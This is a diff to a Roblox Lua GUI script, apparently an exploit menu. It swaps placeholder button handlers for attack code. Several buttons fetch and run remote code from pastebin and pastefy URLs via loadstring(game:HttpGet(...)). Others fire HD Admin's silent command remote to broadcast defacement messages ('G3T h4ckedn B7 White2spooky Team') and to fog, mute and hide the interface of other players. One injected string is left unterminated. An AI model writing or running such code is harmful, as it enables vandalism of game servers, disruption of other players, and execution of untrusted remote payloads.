@@ -982,7 +982,7 @@ ImageLabel_1.BackgroundColor3 = Color3.fromRGB(162,162,162)
 ImageLabel_1.BackgroundTransparency = 1
 ImageLabel_1.BorderSizePixel = 1
 ImageLabel_1.BorderColor3 = Color3.fromRGB(27,42,53)
-ImageLabel_1.Image = [[rbxthumb://type=Asset&id=107718665619260&w=420&h=420]]
+ImageLabel_1.Image = [[rbxthumb://type=Asset&id=98964423944040&w=420&h=420]]
 ImageLabel_1.ImageTransparency = 0
 ImageLabel_1.ImageRectOffset = Vector2.new(0,0)
 ImageLabel_1.ImageRectSize = Vector2.new(0,0)
@@ -1626,7 +1626,7 @@ TextButton16_6.Font = Enum.Font.Code
 TextButton16_6.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16_6.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16_6.MouseButton1Click:Connect(function()
-    print('TextButton16_6 clicked')
+    loadstring(game:HttpGet("https://pastebin.com/raw/BvBtAujC"))()
 end)
 
 local TextButton16_7 = Instance.new('TextButton')
@@ -1983,7 +1983,10 @@ TextButton16_15.Font = Enum.Font.Code
 TextButton16_15.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16_15.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16_15.MouseButton1Click:Connect(function()
-    print('TextButton16_15 clicked')
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+RequestCommand:InvokeServer(";h D3EZZTROYED BYY H4RKZ&WHITE2SP*OKY
 end)
 
 local TextButton16_16 = Instance.new('TextButton')
@@ -2006,7 +2009,10 @@ TextButton16_16.Font = Enum.Font.Code
 TextButton16_16.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16_16.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16_16.MouseButton1Click:Connect(function()
-    print('TextButton16_16 clicked')
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+RequestCommand:InvokeServer(";h G3T h4ckedn B7 White2spooky Team!!")
 end)
 
 local TextButton4_1 = Instance.new('TextButton')
@@ -2075,7 +2081,10 @@ TextButton11.Font = Enum.Font.Code
 TextButton11.TextXAlignment = Enum.TextXAlignment.Center
 TextButton11.TextYAlignment = Enum.TextYAlignment.Center
 TextButton11.MouseButton1Click:Connect(function()
-    print('TextButton11 clicked')
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+RequestCommand:InvokeServer(";music time 14")
 end)
 
 local TextButton16_17 = Instance.new('TextButton')
@@ -2098,7 +2107,7 @@ TextButton16_17.Font = Enum.Font.Code
 TextButton16_17.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16_17.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16_17.MouseButton1Click:Connect(function()
-    print('TextButton16_17 clicked')
+    loadstring(game:HttpGet("https://pastebin.com/raw/tfrPYDYz"))()
 end)
 
 local TextButton10 = Instance.new('TextButton')
@@ -2111,7 +2120,7 @@ TextButton10.BackgroundColor3 = Color3.fromRGB(255,255,255)
 TextButton10.BackgroundTransparency = 0
 TextButton10.BorderSizePixel = 1
 TextButton10.BorderColor3 = Color3.fromRGB(27,42,53)
-TextButton10.Text = [[Kill All]]
+TextButton10.Text = [[AnTi Sk/d]]
 TextButton10.TextColor3 = Color3.fromRGB(0,0,0)
 TextButton10.TextTransparency = 0
 TextButton10.TextSize = 8
@@ -2121,7 +2130,10 @@ TextButton10.Font = Enum.Font.Code
 TextButton10.TextXAlignment = Enum.TextXAlignment.Center
 TextButton10.TextYAlignment = Enum.TextYAlignment.Center
 TextButton10.MouseButton1Click:Connect(function()
-    print('TextButton10 clicked')
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+RequestCommand:InvokeServer(";unmusic ;undisco ;hide guis others ;fog 99999 99999 ;mute all")
 end)
 
 local TextButton14 = Instance.new('TextButton')
@@ -2144,7 +2156,7 @@ TextButton14.Font = Enum.Font.Code
 TextButton14.TextXAlignment = Enum.TextXAlignment.Center
 TextButton14.TextYAlignment = Enum.TextYAlignment.Center
 TextButton14.MouseButton1Click:Connect(function()
-    print('TextButton14 clicked')
+    loadstring(game:HttpGet("https://pastebin.com/raw/Md8U5MAW"))()
 end)
 
 local TextButton16_18 = Instance.new('TextButton')
@@ -2167,7 +2179,7 @@ TextButton16_18.Font = Enum.Font.Code
 TextButton16_18.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16_18.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16_18.MouseButton1Click:Connect(function()
-    print('TextButton16_18 clicked')
+    loadstring(game:HttpGet("https://pastebin.com/raw/TgPFs5T8"))()
 end)
 
 local TextButton16_19 = Instance.new('TextButton')
@@ -2190,7 +2202,7 @@ TextButton16_19.Font = Enum.Font.Code
 TextButton16_19.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16_19.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16_19.MouseButton1Click:Connect(function()
-    print('TextButton16_19 clicked')
+    loadstring(game:HttpGet("https://pastebin.com/raw/TU3D9CPJ"))()
 end)
 
 local UIStroke_2 = Instance.new('UIStroke')
@@ -2216,7 +2228,7 @@ TextButton16_20.Font = Enum.Font.Code
 TextButton16_20.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16_20.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16_20.MouseButton1Click:Connect(function()
-    print('TextButton16_20 clicked')
+    loadstring(game:HttpGet("https://pastebin.com/raw/RC0L31iN"))()
 end)
 
 local TextButton16_21 = Instance.new('TextButton')
@@ -2239,7 +2251,7 @@ TextButton16_21.Font = Enum.Font.Code
 TextButton16_21.TextXAlignment = Enum.TextXAlignment.Center
 TextButton16_21.TextYAlignment = Enum.TextYAlignment.Center
 TextButton16_21.MouseButton1Click:Connect(function()
-    print('TextButton16_21 clicked')
+    loadstring(game:HttpGet("https://pastefy.app/SUyMLMC5/raw"))()
 end)
 
 local UIDragDetector = Instance.new('UIDragDetector')
